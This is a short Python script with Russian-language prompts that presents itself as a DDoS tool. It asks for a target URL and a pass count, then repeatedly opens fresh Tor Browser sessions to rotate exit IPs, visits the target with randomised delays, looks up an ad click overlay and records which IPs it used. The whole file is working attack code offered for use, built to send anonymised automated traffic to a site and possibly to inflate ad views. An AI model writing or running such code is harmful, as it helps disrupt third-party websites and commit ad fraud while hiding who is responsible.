import os
import random
from selenium import webdriver
from collections import Counter
from tbselenium.tbdriver import TorBrowserDriver
from selenium.webdriver.support.ui import WebDriverWait
import pickle 

na_file = open('/home/serj/python/tor_ip', 'wb')
array = []
i = 0
url = str(input('Введите адрес страницы для DDoS атаки: '))
q = int(input('Введите количество проходов: '))
time = int(input('Введите время задержки на странице: ' )) 
while i < q:
	with TorBrowserDriver("/home/serj/selenium/tor-browser_en-US/") as driver:
		driver.get('https://2ip.ru/')	
		ipconf = driver.find_element_by_id('d_clip_button')
		ip = ipconf.text
		realtime = str(time + random.randint(1, 15))
		array.append(ip)
		driver.get(url)
		realtime = str(time + random.randint(1, 15))
		driver.implicitly_wait(realtime)
		link1 = driver.find_elements_by_id('adContent-clickOverlay')
		i +=1
		print('Выполнение ' + str (i/q*100) + ' % ' + ' Задержкасна странице - ' + str(realtime)+ 'сек.')
		driver.close()
abc = Counter(array)

pickle.dump(abc, na_file)
na_file.close()
print('DDoS атака завершена, Использованные IP адреса в формате - IPадрес: Кол-во использований,')
print(abc)
